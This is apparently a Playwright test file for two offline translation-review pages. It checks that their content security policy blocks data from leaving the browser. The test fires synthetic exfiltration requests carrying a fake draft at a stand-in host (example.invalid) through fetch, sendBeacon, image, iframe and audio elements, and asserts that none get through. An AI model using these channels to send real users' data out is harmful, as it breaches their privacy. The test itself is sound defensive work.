import { expect, test } from '@playwright/test';

// The two standalone reviewers store confidential drafts in browser-local
// storage. These synthetic probes must be blocked BEFORE network dispatch.
// All collectors are intercepted locally, never contacted.
const pages = [
  ['public translation review', new URL('../docs/translation-review/index.html', import.meta.url).href],
  ['standalone original-question review', new URL('../docs/original-question-translation-review/index.html', import.meta.url).href],
];

for (const [label, url] of pages) {
  test(`${label} runs its pinned editor, exports offline and blocks synthetic egress`, async ({ page }) => {
    const egress = [];
    const jsErrors = [];
    await page.route(/example\.invalid/, async route => {
      egress.push(route.request().url());
      await route.fulfill({ status: 204 });
    });
    page.on('pageerror', error => jsErrors.push(error.message));
    await page.goto(url);

    // This also detects a stale/incorrect script-src hash: the UI must run.
    const note = page.getByLabel('s1-politics-01 审校备注');
    await expect(note).toBeVisible();
    await note.fill('纯合成复核备注：离线存储与隐私防护测试');
    const [download] = await Promise.all([
      page.waitForEvent('download'),
      page.locator('#export').click(),
    ]);
    const { readFile } = await import('node:fs/promises');
    const record = JSON.parse(await readFile(await download.path(), 'utf8'));
    expect(record.questions.find(q => q.id === 's1-politics-01')).toBeDefined();

    await page.evaluate(async () => {
      const url = 'https://example.invalid/synthetic-review-egress?draft=FAKE';
      void fetch(url).catch(() => {});
      navigator.sendBeacon(url, 'FAKE');
      const image = new Image();
      image.src = url + '&via=image';
      document.body.append(image);
      const iframe = document.createElement('iframe');
      iframe.src = url + '&via=frame';
      document.body.append(iframe);
      const media = document.createElement('audio');
      media.src = url + '&via=media';
      document.body.append(media);
      media.load();
      await new Promise(resolve => setTimeout(resolve, 350));
    });
    expect(egress).toEqual([]);
    expect(jsErrors).toEqual([]);
    await expect(note).toHaveValue('纯合成复核备注：离线存储与隐私防护测试');
  });
}
